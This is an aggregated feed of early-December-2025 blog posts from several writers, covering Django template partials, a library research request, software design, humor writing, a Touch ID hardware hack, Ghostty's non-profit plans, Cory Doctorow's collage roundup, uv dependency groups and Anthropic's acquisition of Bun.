&lt;/section&gt;
</code></pre>
<p>You can also render just a named partial from a template directly in Python code like this:</p>
<pre><code>return render(request, &quot;authors.html#user-info&quot;, {&quot;user&quot;: user})
</code></pre>
<p>I'm looking forward to trying this out in combination with <a href="https://htmx.org">HTMX</a>.</p>
<p>I asked <a href="https://gistpreview.github.io/?8db0c1a50aad95d5bc5b5b7d66a503ab">Claude Code to dig around in my blog's source code</a> looking for places that could benefit from a template partial. Here's <a href="https://github.com/simonw/simonwillisonblog/commit/9b1a6b99140b43e869ada3348ce4d4407e9a06ba">the resulting commit</a> that uses them to de-duplicate the display of dates and tags from pages that list multiple types of content, such as <a href="https://simonwillison.net/tags/django/">my tag pages</a>.</p>

      <h1>Text a community college librarian</h1>

(date: 2025-12-04)
      <p>
      <p>I take tap dance evening classes at the <a href="https://collegeofsanmateo.edu/">College of San Mateo</a> community college. A neat bonus of this is that I'm now officially a student of that college, which gives me access to their library... including the ability to send text messages to the librarians asking for help with research.</p>
<p>I recently wrote about <a href="https://www.niche-museums.com/114">Coutellerie Nontronnaise</a> on my Niche Museums website, a historic knife manufactory in Nontron, France. They had <a href="https://niche-museums.imgix.net/Coutellerie-Nontronnaise-12.jpeg?w=1200&amp;auto=compress">a certificate on the wall</a> claiming that they had previously held a Guinness World Record for the smallest folding knife, but I had been unable to track down any supporting evidence.</p>
<p>I posed this as a text message challenge to the librarians, and they tracked down <a href="https://archive.org/details/lelivreguinnessd0000na/mode/2up?q=nontronnaise">the exact page</a> from the 1989 &quot;Le livre guinness des records&quot; describing the record:</p>
<blockquote>
<p><em>Le plus petit</em></p>
<p>Les établissements Nontronnaise ont réalisé un couteau de 10 mm de long, pour le Festival d’Aubigny, Vendée, qui s’est déroulé du 4 au 5 juillet 1987.</p>

<p>Thank you, Maria at the CSM library!</p>

      <h1>Flip switches</h1>

(date: 2025-12-04)
      <p>
      <p>In software, I like to have multiple ways to view the same data. In one context it's an outline, then flip a switch and now it's a graphic.</p>
<ul>
<li><img src="https://imgs.scripting.com/2023/02/28/presidentCarter.png" alt=""><a href="https://en.wikipedia.org/wiki/MORE_(application)">MORE</a> shipped at <a href="https://daytona.scripting.com/search?q=%22living%20videotext%22">Living Videotext</a> for the Mac in 1986. You start with an outline and flip a switch to turn it into a tree chart. Flip it back to make a change, then flip it again to see the change in a tree chart. Or flip the outline to reveal a set of presentation slides. People loved the idea that they could create graphics entirely by writing and reorganizing and then flipping a switch. That was the <a href="https://en.wikipedia.org/wiki/Killer_application">killer feature</a> in the demos we did at trade shows.</li>
<li><img src="https://imgs.scripting.com/2025/12/04/ucsdPascal.png" alt="">Before that in <a href="https://daytona.scripting.com/search?q=lbbs">LBBS</a>, a bulletin board system I wrote and ran on an Apple II in my Menlo Park living room in the early 80s, I had two views of the message structure, reverse chronologic and a hierarchic thread structure. You could always flip a switch and see the post you're looking at in the other view. If you're catching up and want to see where in the tree this message lives you, flip the switch. If you've come across a two year old post in the tree, and want to see what else was going on in 1982 (for example), flip the switch into the message scanner, and you've gone back in time. And the flip-switch was instantaneous and required one gesture, no thinking on your part.</li>
<li><img src="https://imgs.scripting.com/2022/03/14/goodbyeBlueMonday.png" alt="">And then <a href="https://daytona.scripting.com/search?q=Manila">Manila</a>, many years later, written in <a href="http://scripting.com/2021/01/04/140651.html?title=whatFrontierIsAbout">Frontier</a>, started as a discussion group. It was the software behind <a href="https://discuss.userland.com/msg000001.html">discuss.userland.com</a>, which was where the initial blogosphere formed in 1998 and 1999. Go through the archive to see for yourself. But then we had the idea that hey this could be a blog, so when you created a blog post, unwittingly behind the scenes, it just created a discussion post. So all you had to do was flip a switch when you were reading a post, and see the post in the discussion group. There's that duality again.</li>
</ul>
<p>I'm working on discourse with <a href="https://wordland.social/">WordLand</a> in the middle, and <a href="https://daytona.scripting.com/search?q=wordpress">WordPress</a> at the <a href="https://en.wikipedia.org/wiki/Graph_theory#Directed_graph">edges</a>, where a comment is also a blog post. Readers might not know that they're reading something that has a dual life as a comment linked to someone else's post. There can be a flip-switch in both views that lets you go back and forth. I can only guarantee that the flip switch will be in my software, since this will be an open network, there can be any number of different ways to view the content.</p>
<p>As <a href="https://en.wikipedia.org/wiki/Guy_Kawasaki">someone</a> famous once <a href="http://scripting.com/davenet/1994/11/26/letathousandflowersbloom.html">said</a> &quot;Let a thousand flowers bloom.&quot;</p>
<p>Why should comment writing not have all the features of blog post writing? Why invent a new more limited text type instead of reusing the one you created for blogging? That's where <a href="https://daytona.scripting.com/search?q=factoring">factoring</a> comes in.</p>

      <h1>A Newsletter of Humorous Writing #421</h1>

(date: 2025-12-04)
      <p>
      <h3><em>For November 26-December 2, 2025</em></h3>
<p>Hello and welcome to <strong>A Newsletter of Humorous Writing</strong>, a roundup of the week's finest short humor pieces and funny articles, and a celebration of the fantastic writers who wrote them. Hello to the new subscribers joining us this week! Many of you found us through <a href="https://www.jijilee.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-421">Friend of the Newsletter JiJi Lee’s</a> very kind mention in a <em>New Yorker</em> newsletter last week. (Thanks JiJi!)</p>
<p>We hope you enjoy your stay here at the Newsletter! We change the towels every other day and you can order food from the kitchen after 10pm if your premise is especially clear.</p>

<h2>What We Enjoyed This Week</h2>

<p><a href="https://www.pointsincase.com/articles/texting-your-dad-simulator?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-421"><strong>Texting Your Dad Simulator</strong></a> <strong>by</strong> <a href="https://livrariaplutao.bigcartel.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-421"><strong>Luís Leal Miranda</strong></a> <em>(Points in Case)</em> We’re big fans of stuff riffing on tabletop, dice, and math games (see our previous projects <a href="https://supersecretarts.com/spacecouncil?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-421">Space Council</a> and <a href="https://tribecafilm.com/films/scriptulated-2023?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-421">Scriptulated</a>), so we were immediately very on board with Luís’s format choice. Things like quantifying “Emotional Distance” and tracking a “Guiltmeter” are very fun, but Luís doesn’t neglect the fun dad specifics, like texting the prawn emoji.</p>

Daniel’s piece has an <em>I Think You Should Leave</em> sort of premise: a character who is overconfident, unapologetic, and digs in their heels about something that is both low stakes and obviously destined for failure.</p>

(date: 2025-12-03)
      <p>
      <p>Why doesn't Apple make a standalone Touch ID?</p>
<p>I finally upgraded to a mechanical keyboard. But because Apple's so protective of their Touch ID hardware, there aren't any mechanical keyboards with that feature built in.</p>
<p><img src="https://www.jeffgeerling.com/sites/default/files/images/apple-touch-id-external-3d-printed-sensor.jpg" alt="Apple Touch ID - external 3D printed sensor"></p>
<p>But there <em>is</em> a way to hack it. It's incredibly wasteful, and takes a bit more patience than I think <em>most</em> people have, but you basically take an Apple Magic Keyboard with Touch ID, rip out the Touch ID, and install it in a 3D printed box, along with the keyboard's logic board.</p>

      <h1>Quoting Mitchell Hashimoto</h1>

      <blockquote>
<p>Since the beginning of the project in 2023 and the private beta days of Ghostty, I've repeatedly expressed my intention that Ghostty legally become a non-profit. [...]</p>
<p>I want to squelch any possible concerns about a <a href="https://en.wikipedia.org/wiki/Exit_scam">&quot;rug pull&quot;</a>. A non-profit structure provides enforceable assurances: the mission cannot be quietly changed, funds cannot be diverted to private benefit, and the project cannot be sold off or repurposed for commercial gain. The structure legally binds Ghostty to the public-benefit purpose it was created to serve. [...]</p>
<p><strong>I believe infrastructure of this kind should be stewarded by a mission-driven, non-commercial entity that prioritizes public benefit over private profit.</strong> That structure increases trust, encourages adoption, and creates the conditions for Ghostty to grow into a widely used and impactful piece of open-source infrastructure.</p>

      <h1>Pluralistic: A year in illustration (2025 edition) (03 Dec 2025)</h1>

(date: 2025-12-03)
      <p>
      <p>Today's links A year in illustration (2025 edition): I think I'm getting the hang of this? Hey look at this: Delights to delectate. Object permanence: HADOPI is born; Tea Party wants to disenfranchise renters; How to kill TPP; Mozilla ejects Thunderbird; Rosa Parks was a lifelong radical activist. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. A year in illustration (2025 edition) (permalink) One of the most surprising professional and creative developments of my middle-age has been discovering my love of collage. I have never been a &quot;visual&quot; person – I can't draw, I can't estimate whether a piece of furniture will fit in a given niche, I can't catch a ball, and I can't tell you if a picture is crooked. When Boing Boing started including images with our posts in the early 2000s, I hated it. It was such a chore to find images that were open licensed or public domain, and so many of the subjects I wrote about are abstract and complex and hard to illustrate. Sometimes, I'd come up with a crude visual gag and collage together a few freely usable images as best as I could and call it a day. But over the five years that I've been writing Pluralistic, I've found myself putting more and more effort and thought into these header images. Without realizing it, I put more and more time into mastering The GIMP (a free/open Photoshop alternative), watching tutorial videos and just noodling from time to time. I also discovered many unsuspected sources of public domain work, such as the Library of Congress, whose search engine sucks, but whose collection is astounding (tip: use Kagi or Google to search for images with the &quot;site:loc.gov&quot; flag). I also discovered the Met's incredible collection: <a href="https://www.metmuseum.org/art/collection/search">https://www.metmuseum.org/art/collection/search</a> And the archives of H Armstrong Roberts, an incredibly prolific stock photographer whose whole corpus is in the public domain. You can download more than 14,000 of his images from the Internet Archive (I certainly did!): <a href="https://archive.org/details/h-armstrong-roberts">https://archive.org/details/h-armstrong-roberts</a> Speaking of the Archive and search engine hacks, I've also developed a method for finding hi-rez images that are otherwise very hard to get. Often, an image search will turn up public domain results on commercial stock sites like Getty. If I can't find public domain versions elsewhere (e.g. by using Tineye reverse-image search), I look for Getty's metadata about the image's source (that is, which book or collection it came from). Then I search the Internet Archive and other public domain repositories for high-rez PDF scans of the original work, and pull the images out of there. Many of my demons come from Compendium rarissimum totius Artis Magicae sistematisatae per celeberrimos Artis hujus Magistros, an 18th century updating of a 11th century demonolgy text, which you can get as a hi-rez at the Wellcome Trust: <a href="https://wellcomecollection.org/works/cvnpwy8d">https://wellcomecollection.org/works/cvnpwy8d</a> Five years into my serious collage phase, I find myself increasingly pleased with the work I'm producing. I actually self-published a little book of my favorites this year (Canny Valley), which Bruce Sterling provided an intro for and which the legendary book designer John Berry laid out fot me, and I'm planning future volumes: <a href="https://pluralistic.net/2025/09/04/illustrious/#chairman-bruce">https://pluralistic.net/2025/09/04/illustrious/#chairman-bruce</a> I've been doing annual illustration roundups for the past several years, selecting my favorites from the year's crop: 2022: <a href="https://pluralistic.net/2022/12/25/a-year-in-illustration/">https://pluralistic.net/2022/12/25/a-year-in-illustration/</a> 2023: <a href="https://pluralistic.net/2023/12/21/collages-r-us/">https://pluralistic.net/2023/12/21/collages-r-us/</a> 2024: <a href="https://pluralistic.net/2024/12/07/great-kepplers-ghost/">https://pluralistic.net/2024/12/07/great-kepplers-ghost/</a> It's a testament to how much progress I've made that when it came time to choose this year's favorites, I had 33 images I wanted to highlight. Much of this year's progress is down to my friend and neighbor Alistair Milne, an extremely talented artist and commercial illustrator who has periodically offered me little bits of life-changing advice on composition and technique. I've also found a way to use these images in my talks: I've pulled together a slideshow of my favorite (enshittification-related) images, formatted for 16:9 (the incredibly awkward aspect ratio that everyone seems to expect these days), with embedded Creative Commons attributions. When I give a talk, I ask to have this run behind me in &quot;kiosk mode,&quot; looping with a 10-second delay between each slide. Here's an up-to-date (as of today) version: <a href="https://archive.org/download/enshittification-slideshow/enshittification.pptx">https://archive.org/download/enshittification-slideshow/enshittification.pptx</a> If these images intrigue you and you'd like hi-rez versions to rework on your own, you can get full rez versions of all my blog collagesin my &quot;Pluralistic Collages&quot; Flickr set: <a href="https://www.flickr.com/photos/doctorow/albums/72177720316719208">https://www.flickr.com/photos/doctorow/albums/72177720316719208</a> They're licensed CC BY-SA 4.0, though some subelements may be under different licenses (check the image descriptions for details). But everything is licensed for remix and commercial distribution, so go nuts! All the books I reviewed in 2025 The underlying image comes from the Library of Congress (a search for &quot;reading + book&quot;) (because &quot;reading&quot; turns up pictures of Reading, PA and Reading, UK). I love the poop emoji from the cover of the US edition of Enshittification and I'm hoping to get permission to do a lot more with it. <a href="https://pluralistic.net/2025/12/02/constant-reader/#too-many-books">https://pluralistic.net/2025/12/02/constant-reader/#too-many-books</a> Meta's new top EU regulator is contractually prohibited from saying mean things about Meta Mark Zuckerberg's ghastly Metaverse avatar is such a gift to his critics. I can't believe his comms team let him release it! The main image is an H Armstrong Roberts classic of a beat cop wagging his finger at a naughty lad on a bicycle. The Wachowskis' 'code waterfall' comes from this generator: <a href="https://github.com/yeaayy/the-matrix">https://github.com/yeaayy/the-matrix</a> <a href="https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta">https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta</a> The long game In my intro to last year's roundup, I wrote about Joseph Keppler, the incredibly prolific illustrator and publisher who founded Puck magazine and drew hundreds of illustrations, many of them editorial cartoons that accompanied articles that criticized monopolies and America's oligarch class. As with so much of his work, Keppler's classic illustration of Rockefeller as a shrimpy, preening king updates very neatly to today's context, through the simple expedient of swapping in Zuck's metaverse avatar. <a href="https://pluralistic.net/2025/11/20/if-you-wanted-to-get-there/#i-wouldnt-start-from-here">https://pluralistic.net/2025/11/20/if-you-wanted-to-get-there/#i-wouldnt-start-from-here</a> Facebook's fraud files I love including scanned currency in my illustrations. Obviously, large-denomination bills make for great symbols in posts about concentrated wealth and power, but also, US currency is iconic, covered in weird illustrations, and available as incredibly high-rez scans, like this 7,300+ pixel-wide C-note: <a href="https://commons.wikimedia.org/wiki/File:U.S">https://commons.wikimedia.org/wiki/File:U.S</a>._hundred_dollar_bill,_1999.jpg It turns out that intaglio shading does really cool stuff when you tweak the curves. I love what happened to Ben Franklin's eyes in this one. (Zuck's body is another Keppler/Puck illo!) <a href="https://pluralistic.net/2025/11/08/faecebook/#too-big-to-care">https://pluralistic.net/2025/11/08/faecebook/#too-big-to-care</a> There's one thing EVERY government can do to shrink Big Tech This is another Keppler/Roberts mashup. Keppler's original is Teddy Roosevelt as a club-wielding (&quot;speak softly and carry a big stick&quot;) trustbusting Goliath. The crying baby and money come from an H Armstrong Roberts tax-protest stock photo (one of the money sacks was originally labeled &quot;TAXES&quot;). <a href="https://commons.wikimedia.org/wiki/File:HAL9000.svg">https://commons.wikimedia.org/wiki/File:HAL9000.svg</a> <a href="https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack">https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack</a> When AI prophecy fails The chain-gang photo comes from the Library of Congress. That hacker hoodie is a public domain graphic ganked from Wikimedia Commons. This one also includes one of my standbys, Cryteria's terrific vector image of HAL 9000's glaring red eye, always a good symbolic element for stories about Big Tech, surveillance, and/or AI. I love how the HAL 9000 eye pops as the only color element in this one. <a href="https://pluralistic.net/2025/10/29/worker-frightening-machines/#robots-stole-your-jerb-kinda">https://pluralistic.net/2025/10/29/worker-frightening-machines/#robots-stole-your-jerb-kinda</a> Checking in on the state of Amazon's chickenized reverse-centaurs Another H Armstrong Roberts remix: originally, this was a grinning delivery man jugging several parcels. I reskinned him and his van with Amazon delivery livery, and matted in the horse-head to create a &quot;reverse centaur&quot; (another theme I return to often). I used one of Alistair Milne's tips to get that horse's head right: rather than trying to trace all the stray hairs on the mane, I traced them with a fine brush tool on a separate layer, then erased the strays from the original and merged down to get a nice, transparency-enabled hair effect. <a href="https://pluralistic.net/2025/10/23/traveling-salesman-solution/#pee-bottles">https://pluralistic.net/2025/10/23/traveling-salesman-solution/#pee-bottles</a> The mad king's digital killswitch The Uncle Sam image is Keppler's (who else?). In the original (which is about tariffs! everything old is new!), Sam's legs have become magnets that are drawing in people and goods from all over the world. The Earth-from-space image is a NASA pic. Love that all works of federal authorship are born in the public domain! <a href="https://pluralistic.net/2025/10/20/post-american-internet/#huawei-with-american-characteristics">https://pluralistic.net/2025/10/20/post-american-internet/#huawei-with-american-characteristics</a> Microsoft, Tear Down That Wall! Clippy makes a perfect element for posts about chatbots. It's hard to think that Microsoft shipped a product with such a terrible visual design, but at the same time, I gotta give 'em credit, it's so awful that it's still instantly recognizable, 25 years later. <a href="https://pluralistic.net/2025/10/15/freedom-of-movement/#data-dieselgate">https://pluralistic.net/2025/10/15/freedom-of-movement/#data-dieselgate</a> A disenshittification moment from the land of mass storage Another remix of Keppler's excellent Teddy Roosevelt/trustbuster giant image, this time with Ben Franklin's glorious C-note phiz. God, I love using images from money! <a href="https://pluralistic.net/2025/10/10/synology/#how-about-nah">https://pluralistic.net/2025/10/10/synology/#how-about-nah</a> Apple's unlawful evil Alistair Milne helped me work up a super hi-rez version of Trump's hair from his official (public domain) 2024 presidential portrait. Lots of tracing those fine hairs, and boy does it pay off. Apple's &quot;Think Different&quot; wordmark (available as a vector on Wikimedia Commons) is a gift to the company's critics. The fact that the NYPD actually routinely show up for protests dressed like this makes my job too easy. <a href="https://pluralistic.net/2025/10/06/rogue-capitalism/#orphaned-syrian-refugees-need-not-apply">https://pluralistic.net/2025/10/06/rogue-capitalism/#orphaned-syrian-refugees-need-not-apply</a> Blue Bonds Another C-note remix. One of the things I love about remixing US currency is that every part of it is so immediately identifiable, meaning that just about any crop works. The California bear comes from a public domain vector on Wikimedia Commons. I worked hard to get the intaglio effect to transfer to the bear, but only with middling success. Thankfully, I was able to work at massive resolution (like, 4,000 px wide) and reduce the image, which hides a lot of my mistakes. <a href="https://pluralistic.net/2025/10/04/fiscal-antifa/#post-trump">https://pluralistic.net/2025/10/04/fiscal-antifa/#post-trump</a> The real (economic) AI apocalypse is nigh Another money scan, this time a hyperinflationary Zimbabwean dollar (I also looked at some Serbian hyperinflationary notes, but the Zimbabwean one was available at a higher rez). Not thrilled about the engraving texture on the HAL 9000, but the Sam Altman intaglio kills. I spent a lot of time tweaking that using G'mic, a good (but uneven) plugin suite for the GIMP. <a href="https://pluralistic.net/2025/09/27/econopocalypse/#subprime-intelligence">https://pluralistic.net/2025/09/27/econopocalypse/#subprime-intelligence</a> Rage Against the (Algorithmic Management) Machine This one made this year's faves list purely because I was so happy with how the Doordash backpack came out. The belligerent worker is part of a Keppler diptych showing a union worker and a boss facing off against one another with a cowering consumer caught in the crossfire. I'm not thrilled about this false equivalence, but I'll happily gank the figures, which are great. <a href="https://pluralistic.net/2025/09/25/roboboss/#counterapps">https://pluralistic.net/2025/09/25/roboboss/#counterapps</a> The enshittification of solar (and how to stop it) I spent a lot of time tweaking the poop emoji on those solar panels, eventually painstakingly erasing the frames from the overlay image. It was worth it. <a href="https://pluralistic.net/2025/09/23/our-friend-the-electron/#to-every-man-his-castle">https://pluralistic.net/2025/09/23/our-friend-the-electron/#to-every-man-his-castle</a> AI psychosis and the warped mirror One of those high-concept images that came out perfect. Replacing Narcissus's face (and reflection) with HAL 9000 made for a striking image that only took minutes to turn out. <a href="https://pluralistic.net/2025/09/17/automating-gang-stalking-delusion/#paranoid-androids">https://pluralistic.net/2025/09/17/automating-gang-stalking-delusion/#paranoid-androids</a> Reverse centaurs are the answer to the AI paradox The businessman trundling up a long concrete staircase is another H Armstrong Roberts. That staircase became very existential as soon as I stripped out the grass on either side of it. Finding that horse-head took a lot of doing (the world needs more CC-licensed photos of horses from that angle!). The computer in the background comes from a NASA Ames archive of photos of all kinds of cool stuff – zeppelins, spacesuits, and midcentury &quot;supercomputers.&quot; <a href="https://pluralistic.net/2025/09/11/vulgar-thatcherism/#there-is-an-alternative">https://pluralistic.net/2025/09/11/vulgar-thatcherism/#there-is-an-alternative</a> Radical juries Another high-concept image that just worked. It took me more time to find a good public domain oil painting of a jury than it did to transform each juror into Karl Marx. I love how this looks. <a href="https://pluralistic.net/2025/08/22/jury-nullification/#voir-dire">https://pluralistic.net/2025/08/22/jury-nullification/#voir-dire</a> LLMs are slot-machines It's surprisingly hard to find a decent public domain photo of a slot machine in use. I eventually started to wonder if Vegas had a no-cameras policy in the early years. Eventually, the Library of Commerce came through with a scanned neg that was high enough rez that I could push the elements I wanted to have stand out from an otherwise muddy, washed-out image. <a href="https://pluralistic.net/2025/08/16/jackpot/#salience-bias">https://pluralistic.net/2025/08/16/jackpot/#salience-bias</a> Zuckermuskian solipsism The laborers come from an LoC collection of portraits of children who worked in coal mines in the 1910s. They're pretty harrowing stuff. I spent a long plane ride cropping each individual out of several of these images. <a href="https://pluralistic.net/2025/08/18/seeing-like-a-billionaire/#npcs">https://pluralistic.net/2025/08/18/seeing-like-a-billionaire/#npcs</a> Good ideas are popular The original crowd scene (a presidential inauguration, if memory serves) was super high-rez, which made it very easy to convincingly matte in the monkeys and the Congressional dome. I played with tinting this one, but pure greyscale looked a lot better. <a href="https://pluralistic.net/2025/08/07/the-people-no-2/#water-flowing-uphill">https://pluralistic.net/2025/08/07/the-people-no-2/#water-flowing-uphill</a> By all means, tread on those people Another great high concept. The wordiness of Wilhoit's Law makes this intrinsically funny. There's a public domain vector-art Gadsen flag on Wikimedia Commons. I found a Reddit forum where font nerds had sleuthed out the typeface for the words on the original. <a href="https://pluralistic.net/2025/08/26/sole-and-despotic-dominion/#then-they-came-for-me">https://pluralistic.net/2025/08/26/sole-and-despotic-dominion/#then-they-came-for-me</a> AI's pogo-stick grift The pogo stick kid is another H Armstrong Roberts gank. I spent ages trying to get the bounce effect to look right, and then Alistair Milne fixed it for me in like 10 seconds. The smoke comes from an oil painting of the eruption of Vesuvius from the Met. It's become my go-to &quot;hellscape&quot; background. <a href="https://pluralistic.net/2025/08/02/inventing-the-pedestrian/#three-apis-in-a-trenchcoat">https://pluralistic.net/2025/08/02/inventing-the-pedestrian/#three-apis-in-a-trenchcoat</a> The worst possible antitrust outcome The smoke from Vesuvius makes another appearance. I filled the Android droid with tormented figures from Bosch's &quot;Garden of Earthly Delights,&quot; which is an amazing painting that is available as a more than 15,000 pixel wide (!) scan on Wikimedia Commons. <a href="https://pluralistic.net/2025/09/03/unpunishing-process/#fucking-shit-goddammit-fuck">https://pluralistic.net/2025/09/03/unpunishing-process/#fucking-shit-goddammit-fuck</a> Conservatism considered as a movement of bitter rubes Boy, I love this one. The steamship image is from the Met. The carny barker is a still of WC Fields, whose body language is impeccable. It took a long-ass time to get a MAGA hat in the correct position, but I eventually found a photo of an early 20th C baseball player and then tinted his hat and matted in the MAGA embroidery. <a href="https://pluralistic.net/2025/07/22/all-day-suckers/#i-love-the-poorly-educated">https://pluralistic.net/2025/07/22/all-day-suckers/#i-love-the-poorly-educated</a> Your Meta AI prompts are in a live, public feed These guys on the sofa come from Thomas Hawke, who has recovered and scanned nearly 30,000 &quot;found photos&quot; – collections from estates, yard-sales, etc: <a href="https://www.flickr.com/search/?sort=date-taken-desc&amp;amp;safe">https://www.flickr.com/search/?sort=date-taken-desc&amp;amp;safe</a>_search=1&amp;tags=foundphotograph&amp;user_id=51035555243%40N01&amp;view_all=1 The Shining-esque lobby came from the Library of Congress, where it is surprisingly easy to find images of buildings with scary carpets. <a href="https://pluralistic.net/2025/06/19/privacy-breach-by-design/#bringing-home-the-beacon">https://pluralistic.net/2025/06/19/privacy-breach-by-design/#bringing-home-the-beacon</a> Strange Bedfellows and Long Knives Another great high-concept that turned out great. I think that matting the Heritage Foundation chiselwork into the background really pulls it together, and I'm really happy with the glow-up I did for the knives. <a href="https://pluralistic.net/2025/05/21/et-tu-sloppy-steve/#fractured-fairytales">https://pluralistic.net/2025/05/21/et-tu-sloppy-steve/#fractured-fairytales</a> Are the means of computation even seizable? I spent so long cutting out this old printing press, but boy has it stood me in good stead. I think there's like five copies of that image layered on top of each other here. The figure is an inside joke for all my Luddite trufan pals out there, a remix of a classic handbill depicting General Ned Ludd. <a href="https://pluralistic.net/2025/05/14/pregnable/#checkm8">https://pluralistic.net/2025/05/14/pregnable/#checkm8</a> Mark Zuckerberg announces mind-control ray (again) I was worried that this wouldn't work unless you were familiar with the iconic portrait photo of Rasputin, but that guy was such a creepy-ass-looking freak, and Zuck's metaverse avatar is so awful, that it works on its own merits, too. <a href="https://pluralistic.net/2025/05/07/rah-rah-rasputin/#credulous-dolts">https://pluralistic.net/2025/05/07/rah-rah-rasputin/#credulous-dolts</a> Mike Lee and Jim Jordan want to kill the law that bans companies from cheating you The original image was so grainy, but it was also fantastic and I spent hours rehabbing it.

It was easy to fix, a server needed to be rebooted. The problems cascaded from there, long story, but in the end I had to move one of my virtual-virtual servers (two levels of virtuality) to another virtual server. Upgrading versions of Node is a tricky process that I have never mastered or understood, and every time it takes almost a full day to do it. Something I hope to someday be able to find the time to sort out. Not today, though -- I have a fun project planned out. Really looking forward to doing the work and seeing the result.</p>

(date: 2025-12-03)
      <p>
      <p>The internet wasn’t ruined by accident—it was ruined on purpose. In this episode, <strong>Cory Doctorow</strong> joins us to break down enshittification, his term for the slow, deliberate process that transformed an open, vibrant web into something extractive, frustrating, and increasingly hostile to users. Doctorow explains how platform lock-in, predatory business models, and concentrated corporate power hollowed out the digital spaces we rely on—and, more importantly, how we can build an internet that serves people again.</p>

      <p>The debate about open source AI has largely featured open weight models. But that’s a bit like arguing that in the PC era, the most important goal would have been to have Intel open source its chip designs. That might have been useful to some people, but it wouldn’t have created Linux, Apache, or the […]</p>

      <h1>TIL: Dependency groups and uv run</h1>

(date: 2025-12-03)
      <p>
      <p><strong><a href="https://til.simonwillison.net/uv/dependency-groups">TIL: Dependency groups and uv run</a></strong></p>
<p>I wrote up the new pattern I'm using for my various Python project repos to make them as easy to hack on with <code>uv</code> as possible. The trick is to use a PEP 735 dependency group called <code>dev</code>, declared in <code>pyproject.toml</code> like this:</p>
<pre><code>[dependency-groups]
dev = [&quot;pytest&quot;]

</code></pre>
<p>With that in place, running <code>uv run pytest</code> will automatically install that development dependency into a new virtual environment and use it to run your tests.</p>
<p>This means you can get started hacking on one of my projects (here <a href="https://github.com/datasette/datasette-extract">datasette-extract</a>) with just these steps:</p>
<pre><code>git clone https://github.com/datasette/datasette-extract
cd datasette-extract
uv run pytest

</code></pre>
<p>I also split my <a href="https://til.simonwillison.net/uv">uv TILs out</a> into a separate folder. This meant I had to setup redirects for the old paths, so I had <a href="https://gistpreview.github.io/?f460e64d1768b418b594614f9f57eb89">Claude Code help build me</a> a new plugin called <a href="https://github.com/datasette/datasette-redirects">datasette-redirects</a> and then <a href="https://github.com/simonw/til/commit/5191fb1f98f19e6788b8e7249da6f366e2f47343">apply it to my TIL site</a>, including <a href="https://gistpreview.github.io/?d78470bc652dc257b06474edf3dea61c">updating the build script</a> to correctly track the creation date of files that had since been renamed.</p>

      <h1>Grow, Like a Tree Not a Cancer</h1>

(date: 2025-12-02)
      <p>
      <p>As ever, <a href="https://aworkinglibrary.com/writing/psychology-of-craft">Mandy Brown casually drops a blog post</a> that makes you examine the everyday meaning of words:</p>
<blockquote>
<p>One of the imperatives in contemporary, professional work culture is to “grow.” There is often a sense of height or largeness with that imperative, as if growth must be measured in your distance up the ladder, your territory across the way. In <em>The Soul’s Code</em>, James Hillman implores us to think rather of growing down, of growth not of branch but root, of becoming more grounded, sturdier, less able to be pushed around by the whims of others.</p>
</blockquote>
<p>I love this idea of “growing down”, becoming more rooted and sturdy.</p>
<p>It got me thinking about the word “growth”.</p>
<p>Contemporary usage of the word in business often communicates human intervention and imposition against an otherwise natural outworking.</p>
<p>“Growth” in a forest is different than “growth” in business.</p>
<p>In business, we talk about “growth hacking” as if the natural cadence of growth isn’t sufficient. It requires modification because we deem it insufficiently slow.</p>
<p>We “engineer” growth instead of tending it.</p>
<p>Personally, when I say I want to grow, I mean like a tree. Not like a cancer.</p>
<p>Tree growth responds to its environment and integrates with its ecosystem. Growth is sustainable, balancing expansion and repair. It scales in harmony with its context.</p>
<p>Cancer growth is selfish, consuming resources at the expense of its host. Growth is uncontrolled until <a href="https://notes.jim-nielsen.com/#2025-11-20T0955">the system that supports it</a> collapses. It scales through extraction until failure.</p>
<p>When we talk about the growth of technology in the 21st century, which kind of growth do you think best describes it?</p>
<p>“Hey, {social media | AI} grew so big, we all sat together under its canopy and enjoyed the shade.”</p>
<p>Said no one.</p>
<p>More likely: “Hey, {social media | AI} grew so big, it metastasized beyond what society could bear and now look at the mess we’re in.”</p>

      <h1>Anthropic acquires Bun</h1>

(date: 2025-12-02)
      <p>
      <p><strong><a href="https://www.anthropic.com/news/anthropic-acquires-bun-as-claude-code-reaches-usd1b-milestone">Anthropic acquires Bun</a></strong></p>
<p>Anthropic just acquired the company behind the <a href="https://bun.com/">Bun JavaScript runtime</a>, which they adopted for Claude Code back <a href="https://x.com/jarredsumner/status/1943492457506697482">in July</a>. Their announcement includes an impressive revenue update on Claude Code:</p>
<blockquote>
<p>In November, Claude Code achieved a significant milestone: just six months after becoming available to the public, it reached $1 billion in run-rate revenue.</p>
</blockquote>
<p>Here &quot;run-rate revenue&quot; means that their current monthly revenue would add up to $1bn/year.</p>
<p>I've been watching Anthropic's published revenue figures with interest: their annual revenue run rate was <span class="math inline">\(1 billion in January 2025 and had grown to \)</span>5 billion <a href="https://www.anthropic.com/news/anthropic-raises-series-f-at-usd183b-post-money-valuation">by August 2025</a> and to $7 billion <a href="https://www.anthropic.com/news/statement-dario-amodei-american-ai-leadership">by October</a>.</p>
<p>I had suspected that a large chunk of this was down to Claude Code - given that $1bn figure I guess a large chunk of the rest of the revenue comes from their API customers, since Claude Sonnet/Opus are extremely popular models for coding assistant startups.</p>
<p>Bun founder Jarred Sumner <a href="https://bun.com/blog/bun-joins-anthropic">explains the acquisition here</a>. They still had plenty of runway after their $26m raise but did not yet have any revenue:</p>
<blockquote>
